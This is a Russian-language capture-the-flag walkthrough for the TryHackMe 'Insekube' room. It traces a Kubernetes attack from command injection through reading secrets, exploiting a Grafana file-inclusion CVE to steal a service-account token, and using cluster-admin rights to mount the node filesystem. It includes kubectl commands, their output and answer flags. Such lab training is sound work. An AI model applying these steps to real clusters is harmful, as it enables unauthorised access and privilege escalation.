

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Insekube](https://tryhackme.com/r/room/insekube) 

Всего 7 заданий:
## Задание 1
Цели обучения в этой комнате:
- Взаимодействие с кластером с использованием kubectl
- Чтение секретов Kubernetes
- Проведение разведки внутри кластера
- Переключение учетных записей служб для повышения ваших привилегий
- Боковое перемещение в другие рабочие нагрузки
- Получение доступа к узлам Kubernetes
Мы предполагаем наличие базовых знаний архитектуры Kubernetes и некоторого опыта использования инструментов 
  администрирования Kubernetes, таких как kubectl.

Отказ от ответственности: поскольку эта комната работает на виртуальной машине, она использует minikube, что не 
совсем то же самое, что работа полноценного кластера Kubernetes, поэтому вы можете заметить некоторые 
незначительные различия с реальным кластером.

Загрузка этого компьютера может занять некоторое время (примерно 5 или 6 минут)

Просканируйте машину. (Если вы не знаете, как с этим справиться, рекомендую заглянуть в комнату Nmap)

### Ответьте на вопросы ниже
Какие порты открыты? (через запятую)
```commandline
22,80
```

## Задание 2
Посетите веб-сайт, он берет хост и возвращает вывод команды ping.

Используйте инъекцию команд, чтобы получить обратную оболочку. Для получения дополнительной информации об атаках с инъекцией команд посетите эту комнату

Флаг вы найдете в переменной окружения.

### Ответьте на вопросы ниже
Что такое флаг 1?
```commandline
flag{5e7cc6165f6c2058b11710a26691bb6b}
```

## Задание 3
Kubernetes предоставляет HTTP API для управления кластером. Все ресурсы в кластере могут быть доступны и изменены 
через этот API . Самый простой способ взаимодействия с API — использовать CLI kubectl. Вы также можете 
взаимодействовать с API напрямую с помощью curl или wget, если у вас нет прав на запись и kubectl вы еще не 
присутствуете, вот хорошая статья на эту тему.

Инструкции kubectl по установке можно найти здесь. Однако двоичный файл находится в  /tmp каталоге. В случае, если 
вы столкнетесь со сценарием, когда двоичный файл недоступен, это так же просто, как загрузить двоичный файл на свой 
компьютер и обслуживать его (например, с помощью HTTP- сервера Python ), чтобы он был доступен из контейнера.  

Теперь давайте перейдем в  /tmp каталог, где  kubectl  удобно расположен , и попробуем  команду. Вы увидите ошибку 
«запрещено», которая означает, что у учетной записи службы, запускающей этот pod, недостаточно прав. kubectl get pods 

Инсекубэ
```commandline
challenge@syringe:~$ cd /tmp

challenge@syringe:/tmp$ ls -la
total 45504
drwxrwxrwt 1 root root     4096 Jan 30 19:56 .
drwxr-xr-x 1 root root     4096 Feb 17 20:03 ..
-rwxrwxr-x 1 root root 46587904 Jan 30 19:17 kubectl

challenge@syringe:/tmp$ ./kubectl get pods
```
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:syringe" cannot list resource "pods" in API group "" in the namespace "default"
Вы можете проверить свои разрешения с помощью kubectl auth can-i --list. Результаты показывают, что эта учетная запись службы может перечислять и получать секреты в этом пространстве имен.

Инсекубэ
```commandline
challenge@syringe:/tmp$ ./kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```
### Ответьте на вопросы ниже
```commandline
Ответ не нужен
```

## Задание 4
Kubernetes хранит секретные значения в ресурсах, называемых Secrets, которые затем монтируются в модули как 
переменные среды или файлы.

Вы можете использовать kubectl для перечисления и получения секретов. Содержимое секрета хранится в кодировке base64.

Флаг 2 вы найдете в секрете Kubernetes.

Инсекубэ
```commandline
challenge@syringe:/tmp$ ./kubectl get secrets
NAME                    TYPE                                  DATA   AGE
default-token-8bksk     kubernetes.io/service-account-token   3      41d
developer-token-74lck   kubernetes.io/service-account-token   3      41d
secretflag              Opaque                                1      41d
syringe-token-g85mg     kubernetes.io/service-account-token   3      41d
```
Используйте kubectl describe secret secretflag для перечисления всех данных, содержащихся в секрете. Обратите 
внимание, что данные флага не выводятся этой командой, поэтому давайте выберем формат вывода JSON с помощью: 
`kubectl get secret secretflag -o 'json'`  

### Ответьте на вопросы ниже
Что такое флаг 2?
```commandline
flag{df2a636de15108a4dc41135d930d8ec1}
```

## Задание 5
Некоторые интересные объекты Kubernetes , на которые стоит обратить внимание, это nodes, deployments, services, 
ingress, jobs... Но учетная запись службы, которой вы управляете, не имеет доступа ни к одному из них.

Однако по умолчанию Kubernetes создает переменные среды, содержащие хост и порт других служб, работающих в кластере.

Запустив его, env вы увидите, что Grafana в кластере запущена служба.

Инсекубэ
```commandline
challenge@syringe:/tmp$ env
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_SERVICE_PORT=443
HOSTNAME=syringe-79b66d66d7-7mxhd
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
PWD=/tmp
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/challenge
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=
GOLANG_VERSION=1.15.7
****************************************
SHLVL=2
SYRINGE_PORT_3000_TCP_PORT=3000
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/home/challenge
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
_=/usr/bin/env
```
Kubernetes создаст имя хоста для имени сервиса, чтобы вы могли получить доступ к сервису по адресу 
http://grafana:3000 или к конечной точке Grafana в моем случае http://10.108.133.228:3000.

Сделайте перечисление, чтобы узнать версию. Сверните страницу /login и найдите версию.

Погуглите известные CVE для этой версии Grafana. Она уязвима к LFI (Local File Inclusion). 

### Ответьте на вопросы ниже
Какая версия Grafana установлена на компьютере?
```commandline
8.3.0-beta2
```
Какой CVE вы обнаружили?
```commandline
CVE-2021-43798
```

## Задание 6
Kubernetes хранит токен учетной записи службы, запускающей модуль, в /var/run/secrets/kubernetes.io/serviceaccount/token.   

Используйте уязвимость LFI для извлечения токена. Токен подписан JWTкластером.

Используйте --tokenфлаг kubectlдля использования новой учетной записи службы. Еще раз используйте kubectlдля проверки разрешений этой учетной записи.

Инсекубэ
challenge@syringe:/tmp$ ./kubectl auth can-i --list --token=${TOKEN}
Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
Учетная запись может делать *глагол на *.*ресурсе. Это означает, что это cluster-admin. С этой учетной записью службы вы сможете запустить любую kubectlкоманду. Например, попробуйте получить список подов.

Инсекубэ
challenge@syringe:/tmp$ ./kubectl get pods --token=${TOKEN}
NAME                       READY   STATUS    RESTARTS       AGE
grafana-57454c95cb-v4nrk   1/1     Running   10 (17d ago)   41d
syringe-79b66d66d7-7mxhd   1/1     Running   1 (17d ago)    18d
Используйте kubectl execдля получения оболочки в модуле Grafana. Флаг 3 вы найдете в переменных окружения.

Инсекубэ
challenge@syringe:/tmp$ ./kubectl exec -it grafana-57454c95cb-v4nrk --token=${TOKEN} -- /bin/bash
Unable to use a TTY - input is not a terminal or the right kind of file
hostname
grafana-57454c95cb-v4nrk
### Ответьте на вопросы ниже
Каково имя учетной записи службы, запускающей службу Grafana?
```commandline
developer
```
Сколько модулей запущено?
```commandline
2
```
Что такое флаг 3?
```commandline
flag{288232b2f03b1ec422c5dae50f14061f}
```

## Задание 7
Теперь вы можете закрыть оболочку модуля Grafana и продолжить использование первой, так как она более стабильна.

Имея доступ администратора к кластеру, вы можете создавать любые ресурсы, которые захотите. В этой статье 
объясняется, как получить доступ к узлам Kubernetes, запустив pod, который монтирует файловую систему узла.

Вы можете создать «плохой» pod на основе их первого примера случая . Вам понадобится небольшая модификация, 
поскольку у виртуальной машины нет подключения к Интернету, поэтому она не может извлечь ubuntuобраз контейнера. 
Образ доступен в локальном реестре docker minikube, поэтому вам просто нужно указать Kubernetes использовать 
локальную версию вместо ее извлечения. Вы можете добиться этого, добавив  imagePullPolicy: Neverв свой «плохой» 
контейнер pod. После этого вы можете запустить  kubectl applyдля создания pod. Затем kubectl exec в новом pod вы 
обнаружите файловую систему узла, смонтированную на /host.

Инсекубэ
```commandline
challenge@syringe:/tmp$ ./kubectl apply -f privesc.yml --token=${TOKEN}
pod/everything-allowed-exec-pod created

challenge@syringe:/tmp$ ./kubectl get pods --token=${TOKEN}
NAME                          READY   STATUS    RESTARTS       AGE
everything-allowed-exec-pod   1/1     Running   0              61s
grafana-57454c95cb-v4nrk      1/1     Running   10 (18d ago)   41d
syringe-79b66d66d7-7mxhd      1/1     Running   1 (18d ago)    18d
Инсекубэ
challenge@syringe:/tmp$ ./kubectl exec -it everything-allowed-exec-pod --token=${TOKEN} -- /bin/bash
Unable to use a TTY - input is not a terminal or the right kind of file
hostname
minikube
```
Получите корневой флаг!

### Ответьте на вопросы ниже
Что такое root.txt?
```commandline
flag{30180a273e7da821a7fe4af22ffd1701}
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)